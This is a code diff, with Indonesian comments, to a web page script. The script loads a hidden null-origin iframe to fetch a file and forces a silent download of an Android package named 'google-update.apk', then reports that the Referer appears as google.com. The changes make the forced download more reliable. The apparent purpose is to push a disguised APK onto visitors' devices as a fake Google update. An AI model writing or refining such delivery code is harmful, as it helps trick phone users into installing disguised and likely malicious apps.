@@ -41,6 +41,7 @@
     // Buat iframe dengan origin null
     const iframe = document.createElement('iframe');
     iframe.style.display = 'none';
+    iframe.name = 'downloadFrame';
     
     // Kode yang akan dijalankan di iframe
     const iframeCode = `
@@ -58,8 +59,15 @@
             credentials: 'omit'
           });
           const blob = await r.blob();
-          const url = URL.createObjectURL(blob);
-          parent.postMessage({type: 'OK', url: url}, '*');
+          
+          // Kirim blob sebagai ArrayBuffer ke parent
+          const arrayBuffer = await blob.arrayBuffer();
+          parent.postMessage({
+            type: 'OK', 
+            data: arrayBuffer,
+            size: blob.size,
+            contentType: blob.type
+          }, '*');
         } catch(e) {
           parent.postMessage({type: 'ERR', msg: e.message}, '*');
         }
@@ -75,14 +83,23 @@
     // Terima pesan dari iframe
     const handler = (e) => {
       if (e.data.type === 'OK') {
+        // Buat blob di context parent (bukan iframe)
+        const blob = new Blob([e.data.data], {type: e.data.contentType || 'application/vnd.android.package-archive'});
+        const url = URL.createObjectURL(blob);
+        
         const a = document.createElement('a');
-        a.href = e.data.url;
+        a.href = url;
         a.download = 'google-update.apk';
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
-        URL.revokeObjectURL(e.data.url);
-        iframe.remove();
+        
+        // Cleanup
+        setTimeout(() => {
+          URL.revokeObjectURL(url);
+          iframe.remove();
+        }, 100);
+        
         document.getElementById('status').textContent = 
           'Selesai! Cek Network → Referer: https://www.google.com/';
         
@@ -90,6 +107,8 @@
       }
       if (e.data.type === 'ERR') {
         document.getElementById('status').textContent = 'Error: ' + e.data.msg;
+        iframe.remove();
+        window.removeEventListener('message', handler);
       }
     };
     
